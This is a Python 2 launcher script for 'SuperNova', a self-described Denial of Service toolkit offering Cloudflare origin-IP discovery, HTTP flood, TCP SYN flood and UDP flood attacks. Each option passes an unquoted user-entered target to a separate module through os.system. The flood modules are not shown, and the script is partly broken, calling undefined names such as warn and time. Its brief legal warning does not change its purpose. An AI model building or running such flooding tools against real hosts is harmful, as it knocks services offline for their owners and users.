#!/usr/bin/env python

import os
import re 
import platform
import colorama
from colorama import Fore, Back, Style



R='\033[1;31m'
B='\033[1;34m'
Y='\033[1;33m'
G='\033[1;32m'
C='\033[1;36m'
N='\033[0m' 

if platform.system() == 'Windows':
	warn("Smert Communtity - pcky.")
elif platform.system() == 'Linux':
	_continue = True
	pass



def main():
	
	print \
"""
\033[01;33m .--. .-..-..---.  .--. .--. ,-.,-. .--. .-..-. .--.  \033[0m   
\033[01;33m`._-.': :; :: .; `' '_.': ..': ,. :' .; :: `; :' .; ; \033[0m  
\033[01;33m`.__.'`.__.': ._.'`.__.':_;  :_;:_;`.__.'`.__.'`.__,_;\033[0m  
\033[01;32m            : :                                       \033[0m  
\033[01;32m            :_;                                       \033[0m 


[===]       SuperNova, Denial Of Service toolkit. | version: 1.0            [===]
[===]                                                                       [===]
[===]                  Powered by Gabriel Packy                             [===]
[===]                    github.com/gblpcky                                 [===]
[===]            ~ Distributed Denial of Service ~                          [===]
[===]                                                                       [===]
[===]           ~  Smer't Project Script Booter pcky ~                      [===]


LEGAL WARNING: While this may be helpful for some, there are significant risks.
even though you are innocent. Your are on notice, that using this tool outside your
"own" environment is considered malicious and is against the law. Use with caution.
				

[1] Cloudflare Bust
[2] HTTP Flood Mode
[3] TCP SYN Flood Mode
[4] UDP Flood Mode 


"""

	global option
	option = raw_input('Choose from the following options #~: ')
 
	if option:
		if option == '1':
		  cloudflarebust()

		elif option == '2':
			httpdos()

		elif option == '3':
			synflood() 

		elif option == "4":
			udpflood()	       
				
		else:
			print '\nInvalid Choice\n'
			time.sleep(0.9)
			main()    
 
	else:
		print '\nYou Must Enter An Option (Check if your typo is corrected.)\n'
		time.sleep(0.9)
		main()


def cloudflarebust():
	print("This will search the cloudflare protected website for misconfigured DNS and will extract backend real IP.")
	cloudbam = raw_input("Select a Target Ex: example.com (no http/https and www ) : ")
	os.system("cd modules && python cloudflare.py --target %s"%cloudbam)


def httpdos():
	print("This will flood the websites with 100's and 1000's of http header requests and will try to suck all of it's resources.")
	http = raw_input("Select a Target ( Ex http/site.suffix ) Don't use www in anyway  : ")
	os.system("cd modules && python http_flood.py %s"% http)




def synflood():
	print("This will bombard the host with infinite syn packets and tries to exhaust the resources.")
	synboom = raw_input("Enter the host name : ")
	synlol=raw_input("Enter the port : ")
	os.system("cd modules && python syn.py %s %s "% (synboom, synlol))


def udpflood():
	print("This will send infinite UDP packets and tries to exhaust host's resource fully.")
	os.system("cd modules && python udp.py  ")




if __name__ == '__main__':
	main()
